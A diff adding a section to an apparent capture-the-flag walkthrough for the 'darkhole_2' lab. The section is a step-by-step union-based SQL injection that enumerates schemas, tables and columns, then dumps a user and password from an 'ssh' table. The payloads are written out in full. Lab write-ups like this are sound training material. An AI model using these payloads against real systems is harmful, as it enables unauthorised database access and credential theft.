@@ -112,11 +112,58 @@ burpsuite &> /dev/null & disown
 ![image](https://github.com/user-attachments/assets/d12cb967-dce8-4099-9fce-1f0861d767b7)
 ![image](https://github.com/user-attachments/assets/53c4bd44-77bc-480e-8af0-3954ba11a31a)
 
+### **Showing database**
+```SQLI
+1' order by 6-- - 
+```
+![image](https://github.com/user-attachments/assets/1b46970d-4b91-416d-98db-7fff663a2d60)
 
+```SQLI
+2' union select 1,2,3,4,5,6-- -
+```
+![image](https://github.com/user-attachments/assets/3cf1d124-971d-48b7-8017-fe47deffd766)
+![image](https://github.com/user-attachments/assets/52c76219-f1b9-4b99-be01-afda0eda509f)
 
+```SQLI
+2' union select 1,2,database(),4,5,6-- -
+```
+![image](https://github.com/user-attachments/assets/ffd5caa6-d457-4ee0-a720-2b5972fa8382)
+![image](https://github.com/user-attachments/assets/3e4561d3-b8df-4c06-86a2-4d1b2fd9e999)
 
+```SQLI
+2' union select 1,2,schema_name,4,5,6 from information_schema.schemata-- -
+```
+![image](https://github.com/user-attachments/assets/bca85749-2efc-4ca5-8704-a07b3f55ba28)
+![image](https://github.com/user-attachments/assets/b0eb9738-d9df-4578-b231-926d3325b115)
 
+```SQLI
+2' union select 1,2,group_concat(schema_name),4,5,6 from information_schema.schemata-- -
+```
+![image](https://github.com/user-attachments/assets/b45d280e-405c-467b-8ede-ad661c8e9a32)
+![image](https://github.com/user-attachments/assets/add53760-26fd-4658-ba8b-2f8606805e2e)
 
+### **Showing Tables**
 
+```SQLI
+2' union select 1,2,group_concat(table_name),4,5,6 from information_schema.tables where table_schema='darkhole_2'-- -
+```
+![image](https://github.com/user-attachments/assets/e0c9fafb-2b30-44a4-8e86-a1e07970a733)
+![image](https://github.com/user-attachments/assets/24a07cab-0683-4896-a76a-3d7cbc7a32c9)
 
+### **Showing Columns**
 
+```SQLI
+2' union select 1,2,group_concat(column_name),4,5,6 from information_schema.columns where table_schema='darkhole_2' and table_name="ssh"-- -
+```
+![image](https://github.com/user-attachments/assets/6aac1ac1-bbfb-42a9-af96-1d3a18d82021)
+![image](https://github.com/user-attachments/assets/11edc06f-1aa0-495e-a3c1-d4e162e49484)
+
+### **Showing Content**
+```SQLI
+2' union select 1,2,group_concat(user,0x3a,pass),4,5,6 from ssh-- -
+```
+![image](https://github.com/user-attachments/assets/52cdcd81-f6bf-42cd-9f54-406291011e21)
+![image](https://github.com/user-attachments/assets/06f014b1-d76b-43d4-a9d1-96481042e295)
+
+User:    jehad
+Passwd:  fool
